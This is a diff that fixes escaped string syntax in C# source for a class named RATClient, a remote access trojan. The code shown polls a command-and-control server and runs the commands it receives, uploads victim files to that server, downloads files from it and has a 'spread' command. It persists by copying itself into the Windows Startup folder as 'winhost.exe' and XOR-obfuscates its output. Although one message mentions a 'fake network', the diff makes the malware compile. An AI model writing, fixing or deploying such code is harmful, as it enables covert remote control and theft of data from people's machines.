@@ -23,7 +23,7 @@ class RATClient
             SendClientInfo();
             try
             {
-                string cmd = client.GetStringAsync($\"{C2_SERVER}/get\").Result.Trim();
+                string cmd = client.GetStringAsync($"{C2_SERVER}/get").Result.Trim();
                 if (string.IsNullOrEmpty(cmd))
                 {
                     Thread.Sleep(1000);
@@ -53,7 +53,7 @@ class RATClient
                         {
                             var content = new MultipartFormDataContent();
                             content.Add(new ByteArrayContent(File.ReadAllBytes(path)), "file", Path.GetFileName(path));
-                            client.PostAsync($\"{C2_SERVER}/upload\", content).Wait();
+                            client.PostAsync($"{C2_SERVER}/upload", content).Wait();
                             output = $"[+] Uploaded {path}";
                         }
                         catch (Exception e)
@@ -71,7 +71,7 @@ class RATClient
                     string filename = cmd.Substring(9).Trim();
                     try
                     {
-                        byte[] data = client.GetByteArrayAsync($\"{C2_SERVER}/download/{filename}\").Result;
+                        byte[] data = client.GetByteArrayAsync($"{C2_SERVER}/download/{filename}").Result;
                         File.WriteAllBytes(filename, data);
                         output = $"[+] Downloaded {filename}";
                     }
@@ -82,7 +82,7 @@ class RATClient
                 }
                 else if (cmd == "spread")
                 {
-                    client.PostAsync($\"{C2_SERVER}/spread\", null).Wait();
+                    client.PostAsync($"{C2_SERVER}/spread", null).Wait();
                     output = "[*] Spreading to other machines in the fake network...";
                 }
                 else
@@ -90,9 +90,9 @@ class RATClient
                     output = RunCommand(cmd);
                 }
 
-                string response = $"{currentDir}\\n{output}";
+                string response = $"{currentDir}\n{output}";
                 string encrypted = Xor(response, "nullbeacon");
-                client.PostAsync($\"{C2_SERVER}/result\", new StringContent(encrypted)).Wait();
+                client.PostAsync($"{C2_SERVER}/result", new StringContent(encrypted)).Wait();
             }
             catch { }
 
@@ -138,7 +138,7 @@ class RATClient
         try
         {
             string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            string startupPath = Path.Combine(appData, @"Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+            string startupPath = Path.Combine(appData, @"Microsoft\Windows\Start Menu\Programs\Startup");
             string target = Path.Combine(startupPath, "winhost.exe");
             string currentExe = Process.GetCurrentProcess().MainModule.FileName;
             if (!File.Exists(target))
@@ -153,7 +153,7 @@ class RATClient
     {
         try
         {
-            client.PostAsync($\"{C2_SERVER}/client_info\", new StringContent(clientIdentifier)).Wait();
+            client.PostAsync($"{C2_SERVER}/client_info", new StringContent(clientIdentifier)).Wait();
         }
         catch { }
     }
